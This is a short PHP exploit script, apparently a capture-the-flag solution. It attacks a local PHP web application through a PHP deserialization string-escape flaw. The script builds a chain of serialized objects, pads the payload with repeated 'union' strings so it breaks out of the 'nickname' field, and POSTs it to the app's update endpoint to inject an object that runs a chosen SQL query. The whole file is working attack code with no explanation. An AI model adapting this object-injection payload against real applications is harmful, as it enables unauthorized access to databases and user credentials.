<?php
class User
{
    public $age='select password,id from user where username=?';
    public $nickname=null;
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
}
class UpdateHelper
{
    public $sql;
}
class dbCtrl
{
    public $hostname = "127.0.0.1";
    public $dbuser="noob123";
    public $dbpass="noob123";
    public $database="noob123";
    public $name='admin';
    public $token = 'admin';
}

function post($data){
    $data = http_build_query($data);
    $opts = array (
        'http' => array (
            'method' => 'POST',
            'header'=> "Content-type: application/x-www-form-urlencoded\r\n" .
                "Content-Length: " . strlen($data) . "\r\n",
            'content' => $data
        )
    );
    $html = file_get_contents('http://127.0.0.1:8085/index.php?action=update', false, stream_context_create($opts));
    echo $html;
}

$x = new UpdateHelper();
$x->sql = new User();
$x->sql->nickname = new Info();
$x->sql->nickname->CtrlCase = new dbCtrl();

$p = '";s:8:"CtrlCase";' . serialize($x) . "}";
$p = str_repeat('union', strlen($p)).$p;
echo($p);

post([
    'age' => 123,
    'nickname' => $p
]);
